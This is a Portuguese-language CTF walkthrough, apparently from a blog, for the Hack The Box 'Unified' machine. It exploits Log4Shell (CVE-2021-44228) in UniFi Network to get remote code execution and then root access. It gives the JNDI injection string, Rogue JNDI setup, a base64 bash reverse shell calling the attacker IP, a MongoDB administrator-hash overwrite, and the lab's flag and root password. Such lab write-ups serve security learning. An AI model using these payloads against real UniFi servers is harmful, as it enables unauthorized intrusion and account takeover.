---
description: CTF do Hack The Box como fiz e anotações.
title: HackTheBox - Unified - Fácil
date: 2024-01-15 18:00:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, linux, ssh, web, facil, walk]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/unifilogo.png){: w="100" h="100" .left}

---
# **CTF - HTB Unified - Fácil**
---
## **Enumeração**

### nmap

```shell
sudo nmap -sS -Pn -n --disable-arp-ping --stats-every=7s  10.129.18.186 -p- --min-rate 10000 -oA nmap 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-12 18:52 EST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 87.45% done; ETC: 18:52 (0:00:01 remaining)
Nmap scan report for 10.129.18.186
Host is up (0.14s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
8443/tcp open  https-alt
8843/tcp open  unknown
8880/tcp open  cddbp-alt
```
{: .nolineno }
### gobuster

```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
https://10.129.18.186:8443/[                    (Status: 400) [Size: 435]
https://10.129.18.186:8443/[.php                (Status: 400) [Size: 435]
https://10.129.18.186:8443/].txt                (Status: 400) [Size: 435]
https://10.129.18.186:8443/].old                (Status: 400) [Size: 435]
https://10.129.18.186:8443/]                    (Status: 400) [Size: 435]
https://10.129.18.186:8443/[.old                (Status: 400) [Size: 435]
https://10.129.18.186:8443/].php                (Status: 400) [Size: 435]
https://10.129.18.186:8443/[.txt                (Status: 400) [Size: 435]
https://10.129.18.186:8443/api                  (Status: 200) [Size: 1325]
https://10.129.18.186:8443/diag                 (Status: 200) [Size: 1325]
https://10.129.18.186:8443/file                 (Status: 200) [Size: 1325]
https://10.129.18.186:8443/guest                (Status: 200) [Size: 18706]
https://10.129.18.186:8443/inform               (Status: 400) [Size: 0]
https://10.129.18.186:8443/logout               (Status: 200) [Size: 1325]
https://10.129.18.186:8443/manage               (Status: 200) [Size: 1325]
https://10.129.18.186:8443/op                   (Status: 200) [Size: 1325]
https://10.129.18.186:8443/plain].old           (Status: 400) [Size: 435]
https://10.129.18.186:8443/plain].txt           (Status: 400) [Size: 435]
https://10.129.18.186:8443/plain].php           (Status: 400) [Size: 435]
https://10.129.18.186:8443/plain]               (Status: 400) [Size: 435]
https://10.129.18.186:8443/print                (Status: 200) [Size: 1325]
https://10.129.18.186:8443/quote].txt           (Status: 400) [Size: 435]
https://10.129.18.186:8443/quote].old           (Status: 400) [Size: 435]
https://10.129.18.186:8443/quote]               (Status: 400) [Size: 435]
https://10.129.18.186:8443/quote].php           (Status: 400) [Size: 435]
https://10.129.18.186:8443/setup                (Status: 200) [Size: 1325]
https://10.129.18.186:8443/status               (Status: 200) [Size: 112]
https://10.129.18.186:8443/upload               (Status: 200) [Size: 1325]
https://10.129.18.186:8443/v2                   (Status: 200) [Size: 1325]
https://10.129.18.186:8443/verify               (Status: 200) [Size: 1325]
https://10.129.18.186:8443/wss                  (Status: 200) [Size: 1325]
Progress: 81876 / 81880 (100.00%)
```
{: .nolineno }

Temos uma webapp rodando chamada Unifi Network
Buscando por sua versão encontramos uma vulnerabilidade de RCE
**CVE-2021-44228**

Seguindo um passo a passo de como explorar a falha

Capturar a requisição de login com o burp, adicionar o payload e clicar em send. Resposta de erro.

`"${jndi:ldap://MEUIP/whatever}",`

![Alt text](/assets/img/unifi1.png)

Mesmo com a resposta de erro devemos verificar com wireshark se o payload esta tentando conectar em nossa maquina confirmando a vulnerabilidade.
Abra o wireshark e escolha a interface de rede tun0
Setar o filtro para `tcp.port == 389` e aplicar
Clique em send no burp suite.
Vamos receber isso no wireshark confirmando que a aplicação esta tentando conectar em nosso ip.

![Alt text](/assets/img/unifi2.png)

## **Exploit**

Durante a pesquisa do CVE achei Walkthrough para fazer o próprio exploit.

### Requisitos
Precisamos ter o OpenJDK cheque se já tem com java --version , maven e Rogue JNDI  
Instale:
sudo apt-get install maven

Rogue JNDI é um servidor LDAP malicioso que vai nos permitir enviar comandos para explorar o servidor.  
### Gerando string e servidor LDAP

Gerando o arquivo jar que faz parte do payload.  
`git clone https://github.com/veracode-research/rogue-jndi.git`  
`cd rogue-jndi`  
`mvn package`

![Alt text](/assets/img/unifi3.png)

- String

`echo 'bash -c bash -i >&/dev/tcp/MEUIP/A PORTA DE SUA ESCOLHA 0>&1' | base64`

A string será usada nesse comando

`java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,STRING AQUI}| {base64,-d}|{bash,-i}" --hostname "SEUIP"`
Ficando
```shell
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTUxLzQ0NDMgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname “10.10.14.151”
```
{: .nolineno }

### Reverse Shell

![Alt text](/assets/img/unifi4.png)

Listar o net cat na port escolhida

`nc -lvnp 4443`

Voltando ao burp adicione o payload do nosso LDAP Server

![Alt text](/assets/img/unifi5.png)

Clicar send e receber a reverse shell

### Primeira Flag

cat /home/michael/user.txt
6ced1a6a89e666c0620cdb10262ba127


## **Escalando Privilégio**

Obtendo credencias

O Unifi usa mongodb e seu database padrão e ace.

### Obtendo Credenciais

```shell
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
	"name" : "administrator",
	"email" : "administrator@unified.htb",
	"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
	"time_created" : NumberLong(1640900495),
	"last_site_name" : "default",
	"ui_settings" : {
```
{: .nolineno }

### Editando a senha
	
Em vez de tentar quebrar a hash vamos trocar a senha gerando uma nova hash.
	
```shell
mkpasswd -m sha-512 senha
$6$WkdCd5z2bOB9vE9i$5EDeAqsTQHVNNoIWFrpvjPB5mUDm8GX.81gMLvzq/g/IXanc2jiMTmWZSmH4081uxiv5PU8UFMNT/Uee2mwev.

db.admin.update({ name: "administrator" }, { $set: { "x_shadow": "$6$WkdCd5z2bOB9vE9i$5EDeAqsTQHVNNoIWFrpvjPB5mUDm8GX.81gMLvzq/g/IXanc2jiMTmWZSmH4081uxiv5PU8UFMNT/Uee2mwev." } });

```
{: .nolineno }
Senha alterada podemos logar na aplicação via web
### Senha ssh  root
Unifi permiti acessos ssh, para verificar, acessar menu site.

![Alt text](/assets/img/unifi6.png)

Conseguimos ter acesso a senha sem texto do root:  `NotACrackablePassword4U2022`

Podemos logar no root pelo ssh e obter ultima flag


## Conhecimentos adquiridos:  
- Comandos mongodb  
- Vulnerabilidade da Aplicação Unifi

![Alt text](/assets/img/unifi7.png)
  